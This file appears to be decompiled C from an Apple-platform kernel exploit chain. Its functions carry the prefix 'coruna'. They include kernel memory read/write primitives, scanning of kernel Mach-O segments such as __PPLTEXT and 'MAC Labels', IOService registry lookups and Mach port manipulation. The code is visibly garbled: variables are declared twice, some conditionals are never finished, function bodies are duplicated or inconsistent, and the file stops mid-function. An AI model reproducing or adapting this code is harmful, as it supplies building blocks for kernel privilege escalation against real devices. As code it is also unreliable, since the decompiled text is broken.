void coruna_host_processor_count(long handle,int flags,uint64_t *val)
{
  long handle;
  uint64_t u;
  uint scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 4;
  if ((*(long *)(handle + 0x248) == 0) || (*(long *)(handle + 0x250) == 0)) {
    u = coruna_host_processors(handle,2,&bootargs,&scratch);
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
  handle = 0x248;
  if (flags == 0) {
    handle = 0x250;
  }
  *val = *(uint64_t *)(handle + handle);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t
void coruna_kernel6544_via_host_processor_count(uint *size,long handle,uint64_t val,int flags,uint16_t arg)
{
  uint64_t u;
  long handle;
  uint scratch;
  uint bootargs;
  uint thread_attr;
  uint host_info;
  uint64_t serial_buf;
  
  serial_buf = 0;
  if ((*size & 0x5584201) == 0) {
    u = 0xad008;
  }
  else {
    u = coruna_slab_table_walk(size,&host_info,&thread_attr,&bootargs,&scratch);
    if (((int)u == 0) && (u = coruna_host_processor_count(size,val,&serial_buf), (int)u == 0)) {
      u = 0x28011;
      if ((*(long *)(handle + (unsigned long)host_info) == 0) || (handle = coruna_ptr_canonicalize(size), handle != 0)
         ) {
        *(uint64_t *)(handle + (unsigned long)host_info) = serial_buf;
        if (flags != 0) {
          if (3 < *(uint *)(handle + (unsigned long)thread_attr)) {
            return 0x28011;
          }
          if (12000000 < *(uint *)(handle + (unsigned long)bootargs)) {
            return 0x28011;
          }
          *(uint32_t *)(handle + (unsigned long)thread_attr) = 1;
          *(uint32_t *)(handle + (unsigned long)bootargs) = 12000000;
        }
        if (*(ushort *)(handle + (unsigned long)scratch) < 0x80) {
          u = 0;
          *(uint16_t *)(handle + (unsigned long)scratch) = arg;
        }
      }
      else {
        u = 0x28026;
      }
    }
  }
  return u;
}





long coruna_return_zero_30860(long handle,long addr_2,long off_3,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  unsigned long size;
  
  if (0x1808 < *(int *)(handle + 0x140)) {
    if ((*(long *)(&k_kernel_slot_1a18 + handle) == 0) && (err = coruna_kernel6544_via_nop_stub_6_8(handle), err != 0)) {
      return 0;
    }
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    if (*(uint *)(&k_kernel_slot_18a0 + handle) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + handle);
      do {
        size = ptr[-2];
        if ((size <= arg) && (arg < *ptr + size)) {
          return (arg - size) + ptr[-1];
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
  }
  return (addr_2 - off_3) + arg;
}





void coruna_kernel6544_via_nop_stub_6_8(uint *size)
{
  long handle;
  long addr;
  int err;
  uint64_t u;
  long off;
  long base;
  unsigned long size;
  unsigned long scratch;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(size + 0x626);
  if (off == 0) {
    scratch = scratch & 0xffffffff00000000;
    off = coruna_return_zero_1528c(*(uint64_t *)(size + 0x67e),&scratch);
    if (off == 0 || (uint)scratch == 0) {
      u = 0xad011;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    *(long *)(size + 0x626) = off;
    size[0x628] = (uint)scratch;
done:
    base = 0;
    size = 0;
    do {
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      err = coruna_nop_stub_6(size,off + base,0x18,&scratch);
      if (err == 0) {
        u = 0x2800f;
        if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
        return;
        }
        ___stack_chk_fail(u);
      }
      addr = bootargs;
      if ((*size & 0x20) != 0) {
        addr = bootargs << 0xe;
      }
      handle = (long)size + base;
      *(unsigned long *)(&k_kernel_slot_1a08 + handle) = scratch;
      *(uint64_t *)(&k_kernel_slot_1a10 + handle) = scratch;
      *(long *)(&k_kernel_slot_1a18 + handle) = addr;
      size = size + 1;
      base = base + 0x18;
    } while (size < size[0x628]);
  }
  {
    base = 0;
    size = 0;
    do {
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    err = coruna_nop_stub_6(size,off + base,0x18,&scratch);
    if (err == 0) {
    u = 0x2800f;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
    }
    addr = bootargs;
    if ((*size & 0x20) != 0) {
    addr = bootargs << 0xe;
    }
    handle = (long)size + base;
    *(unsigned long *)(&k_kernel_slot_1a08 + handle) = scratch;
    *(uint64_t *)(&k_kernel_slot_1a10 + handle) = scratch;
    *(long *)(&k_kernel_slot_1a18 + handle) = addr;
    size = size + 1;
    base = base + 0x18;
    } while (size < size[0x628]);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





long coruna_return_zero_30a2c(long handle,long addr_2,long off_3,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  unsigned long size;
  
  if (0x1808 < *(int *)(handle + 0x140)) {
    if ((*(long *)(&k_kernel_slot_1a18 + handle) == 0) && (err = coruna_kernel6544_via_nop_stub_6_8(handle), err != 0)) {
      return 0;
    }
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    if (*(uint *)(&k_kernel_slot_18a0 + handle) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + handle);
      do {
        size = ptr[-1];
        if ((size <= arg) && (arg < *ptr + size)) {
          return (arg - size) + ptr[-2];
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
  }
  return (off_3 - addr_2) + arg;
}





uint64_t coruna_return_zero_30adc(long handle,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000(handle);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_2d034(handle,handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(handle,handle,&bootargs);
    if ((err == 0) ||
       (err = coruna_kernel6544_residual_256(handle,handle + *(int *)(handle + 0x168),&scratch), err == 0)) {
      return 0;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  u = coruna_return_zero_30a2c(handle,bootargs,scratch,val);
  return u;
}





uint64_t coruna_return_zero_30b94(long handle,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000(handle);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_2d034(handle,handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(handle,handle,&bootargs);
    if ((err == 0) ||
       (err = coruna_kernel6544_residual_256(handle,handle + *(int *)(handle + 0x168),&scratch), err == 0)) {
      return 0;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  u = coruna_return_zero_30860(handle,bootargs,scratch,val);
  return u;
}





void coruna_kernel09_via_mach_port_allocate(long handle)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  long addr;
  uint64_t port;
  long scratch;
  int bootargs [32];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x18] = 0;
  bootargs[0x19] = 0;
  bootargs[0x16] = 0;
  bootargs[0x17] = 0;
  bootargs[0x1c] = 0;
  bootargs[0x1d] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x10] = 0;
  bootargs[0x11] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0x14] = 0;
  bootargs[0x15] = 0;
  bootargs[0x12] = 0;
  bootargs[0x13] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  scratch = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  size = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x268));
  if (size == 0) {
    addr = 0;
    do {
      if ((*(long *)(handle + addr + 0x2b0) != 0) && (*(int *)(handle + addr + 0x2b8) != 0)) {
        handle = handle + addr;
        port = *(uint64_t *)(handle + 0x2b0);
        *(uint64_t *)((long)bootargs + addr) = *(uint64_t *)(handle + 0x2b8);
        *(uint64_t *)((long)bootargs + addr + -8) = port;
        *(uint64_t *)(handle + 0x2b8) = 0;
        *(uint64_t *)(handle + 0x2b0) = 0;
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x268));
    addr = 0;
    do {
      if (*(long *)((long)bootargs + addr + -8) != 0) {
        if ((*(int *)((long)bootargs + addr) != 0) &&
           if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
           return;
           }
           ___stack_chk_fail(version);
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    version = 0;
  }
  else {
    u = -size;
    if (-1 < (int)size) {
      u = size;
    }
    version = (unsigned long)(u | 0x40000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(version);
}





uint coruna_vm_protect(unsigned long arg,unsigned long arg,uint64_t *val)
{
  pthread_mutex_t *ptr;
  int err;
  uint32_t u;
  uint8_t *ptr;
  uint size;
  uint version;
  long handle;
  unsigned long port;
  long addr;
  long *ptr;
  long off;
  unsigned long tag;
  vm_inherit_t in_stack_ffffffffffffff30;
  uint scratch;
  int bootargs;
  mem_entry_name_port_t thread_attr;
  unsigned long host_info;
  uint32_t *serial_buf;
  uint64_t action;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  val[6] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  ptr = k_kernel_mach_task_self_slot;
  serial_buf = (uint32_t *)0x0;
  tag = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = 0;
  thread_attr = 0;
  err = *(int *)(arg + 0x140);
  size = 0x2802c;
  port = arg;
  if (err < 0x2258) {
    if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return size;
    }
    ___stack_chk_fail(port);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
  return size;
  }
  ___stack_chk_fail(port);
}





unsigned long coruna_mach_port_deallocate_2d808(uint64_t arg,vm_address_t *val)

{
  uint8_t *data;
  int flags;
  uint u;
  unsigned long size;
  
  size = 0xad001;
  if ((val[2] != 0) && (*val != 0)) {
    flags = coruna_mach_vm_machine_attribute(arg,val[2] + (unsigned long)(uint)val[6],0xffffffff);
    data = k_kernel_mach_task_self_slot;
    if (flags == 0) {
      size = 0x28010;
    }
    else {
      u = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*val,
                             val[1] * (unsigned long)*(uint *)((long)val + 0x1c));
      if ((u == 0) &&
         (u = _mach_port_deallocate
                            (*(ipc_space_t *)data,*(mach_port_name_t *)((long)val + 0x34)),
         u == 0)) {
        size = coruna_kernel6544_via_mach_port_allocate(arg,val[2],(int)val[3]);
      }
      else {
        size = (unsigned long)(u | 0x80000000);
      }
    }
  }
  val[6] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  return size;
}





void coruna_kernel6544_via_mach_port_allocate(long handle)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  long addr;
  uint64_t port;
  long scratch;
  int bootargs [32];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x18] = 0;
  bootargs[0x19] = 0;
  bootargs[0x16] = 0;
  bootargs[0x17] = 0;
  bootargs[0x1c] = 0;
  bootargs[0x1d] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x10] = 0;
  bootargs[0x11] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0x14] = 0;
  bootargs[0x15] = 0;
  bootargs[0x12] = 0;
  bootargs[0x13] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  scratch = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  size = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x268));
  if (size == 0) {
    addr = 0;
    do {
      if ((*(long *)(handle + addr + 0x2b0) != 0) && (*(int *)(handle + addr + 0x2b8) != 0)) {
        handle = handle + addr;
        port = *(uint64_t *)(handle + 0x2b0);
        *(uint64_t *)((long)bootargs + addr) = *(uint64_t *)(handle + 0x2b8);
        *(uint64_t *)((long)bootargs + addr + -8) = port;
        *(uint64_t *)(handle + 0x2b8) = 0;
        *(uint64_t *)(handle + 0x2b0) = 0;
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x268));
    addr = 0;
    do {
      if (((*(long *)((long)bootargs + addr + -8) != 0) &&
          (*(int *)((long)bootargs + addr) != 0)) &&
         if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
         return;
         }
         ___stack_chk_fail(version);
    } while (addr != 0x80);
    version = 0;
  }
  else {
    u = -size;
    if (-1 < (int)size) {
      u = size;
    }
    version = (unsigned long)(u | 0x40000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(version);
}





uint32_t coruna_kernel6544_via_nop_stub_6_9(uint64_t val,long handle,uint64_t id_2)
{
  uint32_t u;
  int err;
  
  err = coruna_nop_stub_6(val,handle + 8,2,id_2);
  u = 0x2800f;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel6544_via_nop_stub_7_5(uint64_t val,long handle,uint16_t arg)
{
  uint32_t u;
  int err;
  uint16_t scratch;
  
  scratch = arg;
  err = coruna_nop_stub_7(val,handle + 8,&scratch,2);
  u = 0x28010;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint coruna_iosurface_index_bias(uint size)
{
  uint u;
  
  u = 0xfffffffe;
  if (size < 0xfff5) {
    u = size + 10;
  }
  if (size < 0xfffe) {
    size = u;
  }
  return size & 0xffff;
}





uint32_t coruna_kernel6544_via_nop_stub_6_10(uint64_t val,long handle)
{
  bool err;
  ushort u;
  int err;
  long handle;
  uint32_t size;
  ushort scratch;
  ushort bootargs;
  
  size = 0x2800f;
  handle = coruna_ptr_canonicalize();
  if (handle == 0) {
    size = 0x28026;
  }
  else {
    err = coruna_nop_stub_6(val,handle + 8,2,&scratch);
    if (err != 0) {
      if (scratch < 0xfffe) {
        u = scratch + 10;
        err = scratch < 0xfff5;
        scratch = 0xfffe;
        if (err) {
          scratch = u;
        }
        bootargs = scratch;
        err = coruna_nop_stub_7(val,handle + 8,&bootargs,2);
        size = 0;
        if (err == 0) {
          size = 0x28010;
        }
      }
      else {
        size = 0;
      }
    }
  }
  return size;
}





unsigned long coruna_kernel6544_via_return_zero_30b94(long arg,unsigned long val)

{
  unsigned long type_id_13;
  int flags;
  long serial_10;
  unsigned long size;
  unsigned long version;
  uint8_t scratch[32];
  unsigned long cache_20;
  
  version = *(unsigned long *)(arg + 0x188);
  size = val & (version ^ 0xffffffffffffffff);
  if ((*(unsigned long *)(&k_kernel_slot_18b8 + arg) == 0 || *(unsigned long *)(&k_kernel_slot_18b8 + arg) != size) ||
     (*(long *)(&k_kernel_slot_18c0 + arg) == 0)) {
    flags = coruna_nop_stub_3(arg,size,scratch);
    if (flags == 0) {
      size = 0;
    }
    else {
      serial_10 = coruna_return_zero_30b94(arg,cache_20 & 0xffffffffc000);
      type_id_13 = 0;
      if (serial_10 != 0) {
        type_id_13 = serial_10 + (version & val);
      }
      size = 0;
      if (serial_10 != 0 && type_id_13 != 0) {
        size = *(unsigned long *)(arg + 0x188);
        *(unsigned long *)(&k_kernel_slot_18b8 + arg) = val & (size ^ 0xffffffffffffffff);
        *(unsigned long *)(&k_kernel_slot_18c0 + arg) = type_id_13 & (size ^ 0xffffffffffffffff);
        size = type_id_13;
      }
    }
  }
  else {
    size = *(long *)(&k_kernel_slot_18c0 + arg) + (version & val);
  }
  return size;
}
uint64_t coruna_find_mac_labels(long *handle)
{
  task_t target_task;
  uint8_t *ptr;
  uint u;
  unsigned long size;
  bool err;
  int err;
  mach_port_t lm6;
  uint version;
  kern_return_t lk8;
  uint port;
  uint tag;
  long handle;
  unsigned long kind;
  long addr;
  long off;
  int *err;
  uint *buf;
  bool status;
  long base;
  uint64_t *str;
  long ctx_val;
  uint type_id;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  uint64_t serial_buf;
  uint64_t action;
  mach_msg_type_number_t block_ctx;
  thread_act_array_t stack_guard;
  mach_port_name_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t tmp_buf;
  uint64_t host_info;
  uint64_t region[7];
  long plist;
  
  plist = *(long *)k_kernel_stack_chk_guard_slot;
  base = *handle;
  port = *(uint *)(handle + 1);
  sa_new = 0;
  sa_saved = 0;
  stack_guard = (thread_act_array_t)0x0;
  block_ctx = 0;
  target_task = *(task_t *)(&k_kernel_slot_18f8 + base);
  serial_buf = 0;
  action = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  path_buf = 0xffffffffffffffff;
  thread_attr = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  host_info = 0xffffffffffffffff;
  tmp_buf = 0xffffffffffffffff;
  handle = coruna_kernel6544_via_nop_stub_2(base,"MAC Labels");
  kind = 0;
  if ((handle == 0) || (kind = coruna_macho_data_seg_38898(base,handle), (int)kind != 0)) {
fail:
    port = 0;
    *(uint *)((long)handle + 0xc) = port;
    if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
    return 0;
    }
    ___stack_chk_fail(kind);
  }
  str = region;
  handle = -3;
  while (ptr = k_kernel_mach_task_self_slot, handle != 0) {
    kind = coruna_kernel6544_via_fcntl_1bf84_2(base,*(long *)(&k_kernel_slot_18f0 + base) +
                                 (unsigned long)(uint)(*(int *)(base + 0x168) * ((int)handle + 4)),str
                         );
    str = str + 1;
    handle = handle + 1;
    {
      port = 0;
      *(uint *)((long)handle + 0xc) = port;
      if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
      return 0;
      }
      ___stack_chk_fail(kind);
    }
  }
  handle = coruna_call_macho_data_seg_2bb24_2bdb4_20fac(base,*(uint32_t *)k_kernel_mach_task_self_slot,&serial_buf);
  version = 0x28026;
  if ((handle == 0) ||
     ((u = (uint)serial_buf, ((uint)serial_buf >> 10 & 1) == 0 &&
      (err = coruna_mach_vm_machine_attribute(base,handle,(uint)serial_buf | 0x400), err == 0))))
  handle = 0;
  err = true;
  do {
  status = err;
  err = *(int *)((long)&action + handle * 4);
  if (err != -1) {
  _close(err);
  }
  handle = 1;
  err = false;
  } while (status);
  handle = 0;
  do {
  port = *(uint *)((long)&path_buf + handle);
  if (port != 0xffffffff) {
  port = _close(port);
  }
  handle = handle + 4;
  } while (handle != 0x30);
  if (1 < sa_saved + 1) {
  port = _mach_port_deallocate(*(ipc_space_t *)ptr,sa_saved);
  }
  kind = (unsigned long)port;
  port = (uint)(version == 0);
  *(uint *)((long)handle + 0xc) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
  return 0;
  }
  ___stack_chk_fail(kind);
}





void coruna_ptr_store(uint64_t val,uint64_t *id_2)
{
  *id_2 = val;
  return;
}





void coruna_ptr_clear(uint64_t *val)
{
  *val = 0;
  return;
}





bool coruna_vm_region_read_u32(long handle,long addr_2,uint32_t *size)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *size = *(uint32_t *)(handle + addr_2);
  }
  return handle != 0;
}





bool coruna_vm_region_write_u32(long handle,long addr_2,uint32_t size)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *(uint32_t *)(handle + addr_2) = size;
  }
  return handle != 0;
}





bool coruna_vm_region_slot_read(long handle,long addr_2,uint64_t *val)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *val = *(uint64_t *)(handle + addr_2);
  }
  return handle != 0;
}





bool coruna_vm_region_slot_write(long handle,long addr_2,uint64_t val)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *(uint64_t *)(handle + addr_2) = val;
  }
  return handle != 0;
}





void coruna_call_vm_protect(uint64_t *val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  
  size_3[5] = 0;
  size_3[4] = 0;
  size_3[7] = 0;
  size_3[6] = 0;
  size_3[1] = 0;
  *size_3 = 0;
  size_3[3] = 0;
  size_3[2] = 0;
  err = coruna_vm_protect(*val,id_2,size_3 + 1);
  if (err == 0) {
    *size_3 = val;
  }
  return;
}





uint64_t coruna_ctx_clear_31c54(uint64_t *val)
{
  uint64_t u;
  
  if (val[1] == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_port_deallocate_2d808(*(uint64_t *)*val);
    if ((int)u == 0) {
      val[5] = 0;
      val[4] = 0;
      val[7] = 0;
      val[6] = 0;
      val[1] = 0;
      *val = 0;
      val[3] = 0;
      val[2] = 0;
    }
  }
  return u;
}





unsigned long coruna_ioservice_path(long arg,unsigned long val)

{
  int count;
  uint64_t type_id_14;
  long serial_10;
  unsigned long size;
  int cache_21 [3];
  int cache_34;
  uint scratch;
  unsigned long work;
  
  if (val == 0) {
    work = val;
    type_id_14 = _IORegistryEntryFromPath
                      (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IOService:/");
    if ((int)type_id_14 + 1U < 2) {
      return 0;
    }
    serial_10 = coruna_ret_stub_3(arg,type_id_14);
    if (serial_10 == 0) {
      return 0;
    }
    work = coruna_return_zero_2b000(arg,serial_10);
    if (work == 0) {
      return 0;
    }
    count = coruna_kernel6544_residual_256(arg,work,&work);
    if (count == 0) {
      return 0;
    }
    work = coruna_kernel6544_via_ctx_test_flag_6(arg,work);
    count = coruna_kernel6544_residual_256(arg,work,&work);
    if (count == 0) {
      return 0;
    }
    val = coruna_kernel6544_via_ctx_test_flag_6(arg,work);
  }
  serial_10 = 0x4000;
  if (*(int *)(arg + 0x180) != 0x4000) {
    serial_10 = 0x100000;
  }
  size = val & -serial_10;
  if (*(int *)(arg + 0x180) != 0x4000) {
    size = (val & -serial_10) + 0x4000;
  }
  if (size < 0xffff000000000000) {
    return 0;
  }
  work = val;
  do {
    count = coruna_nop_stub_6(arg,size,4,cache_21);
    if (count == 0) {
      return 0;
    }
    if (cache_21[0] == -0x1120531) {
      count = coruna_nop_stub_6(arg,size + 4,0x18,(unsigned long)cache_21 | 4);
      if (count == 0) {
        return 0;
      }
      if (((cache_34 == 2) && (8 < scratch)) && (scratch < 0x40)) {
        return size;
      }
    }
    size = size - serial_10;
    if (size < 0xffff000000000000) {
      return 0;
    }
  } while( true );
}





uint64_t coruna_kernel6544_via_ioservice_path(long handle,long addr_2)
{
  int err;
  uint64_t u;
  void *ptr;
  uint32_t size;
  uint64_t version;
  uint64_t port;
  
  if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
    if ((addr_2 == 0) && (addr_2 = coruna_ioservice_path(handle,0), addr_2 == 0)) {
      u = 0x28014;
    }
    else {
      ptr = _calloc(0x128,1);
      if (ptr == (void *)0x0) {
        u = 0xad009;
      }
      else {
        coruna_ctx_clear_1090c(ptr,handle);
        u = *(uint64_t *)(handle + 0x140);
        port = *(uint64_t *)(handle + 0x158);
        version = *(uint64_t *)(handle + 0x150);
        *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
        *(uint64_t *)((long)ptr + 0x70) = u;
        *(uint64_t *)((long)ptr + 0x88) = port;
        *(uint64_t *)((long)ptr + 0x80) = version;
        *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
        *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
        *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
        size = 0x480;
        if (*(unsigned long *)(handle + 0x158) >> 0x2b < 1099) {
          size = 0x80;
        }
        err = coruna_call_find_text_exec_11034(ptr,0,addr_2,size);
        if (err == 0) {
          u = 0x28017;
        }
        else {
          u = 0;
          *(void **)(&k_kernel_slot_19f8 + handle) = ptr;
        }
      }
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_kernel6544_via_kernel6544_via_cpu_capabilities_base(long handle)
{
  uint64_t u;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  
  u = coruna_kernel6544_str_5f_00_00_71_20_01_00_54(*(uint64_t *)(&k_kernel_slot_19f8 + handle),&bootargs,&scratch);
  if (((int)u != 0) && (handle = coruna_kernel6544_via_cpu_capabilities_base(), u = 0, handle != 0)) {
    *(uint64_t *)(&k_kernel_slot_1870 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_1878 + handle) = scratch;
    *(long *)(&k_kernel_slot_1880 + handle) = handle;
    u = 1;
  }
  return u;
}





void coruna_find_ppltext_31f90(uint64_t *val,long handle)
{
  int err;
  long handle;
  unsigned long u;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  err = coruna_ctx_test_flag(handle,0x20);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err != 0) {
      coruna_macho_find_loadcmd(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      val[1] = scratch;
      *val = scratch;
      val[2] = bootargs;
      return;
    }
    coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      *val = scratch;
      val[1] = scratch;
      val[2] = bootargs;
      return;
    }
    scratch = (scratch + bootargs) - 0x20000;
    bootargs = 0x20000;
    handle = coruna_strsep(&scratch,"08 DC 70 92",0,1);
    if ((handle != 0) &&
       (u = coruna_kernel6544_via_kernel6544_via_kernel6544_via_ioconnect_fd_setup(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -4), u != 0)) {
      coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      if ((scratch < u || scratch - u == 0) && (u < bootargs + scratch)) {
        *val = scratch;
        val[1] = u;
        handle = (scratch - u) + bootargs;
        val[2] = handle;
        if (handle != 0) {
          return;
        }
      }
    }
  }
  coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
fail:
  val[1] = scratch;
  *val = scratch;
  val[2] = bootargs;
  return;
}





uint64_t
void coruna_task_info_2e7d8(long handle,uint64_t val,int flags,uint64_t id_2,unsigned long arg)
{
  kern_return_t lk1;
  int err;
  long handle;
  uint64_t u;
  task_flavor_t flavor;
  unsigned long size;
  uint version;
  mach_msg_type_number_t scratch;
  uint8_t bootargs[32];
  uint64_t thread_attr[4];
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) goto fail;
    if (err == 0x1809) {
      version = 0xa0;
      if (flags - 1U < 2) {
      scratch = 2;
      flavor = 0xd;
      err = 8;
      }
      else {
      if (flags != 3) {
      return 0;
      }
      version = version + 8;
      scratch = 8;
      flavor = 0xf;
      err = 0x20;
      }
      if (err == (int)arg) {
      lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
      if (lk1 == 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      handle = coruna_kernel6544_via_return_zero_2b000(handle,val);
      if (handle == 0) {
      return 0;
      }
      }
      else {
      handle = coruna_return_zero_2ce5c();
      if (handle == 0) {
      return 0;
      }
      }
      handle = handle + (unsigned long)version;
      u = coruna_nop_stub_6(handle,handle,arg & 0xffffffff,bootargs);
      if ((int)u == 0) {
      return u;
      }
      err = _memcmp(bootargs,thread_attr,arg & 0xffffffff);
      if (err == 0) {
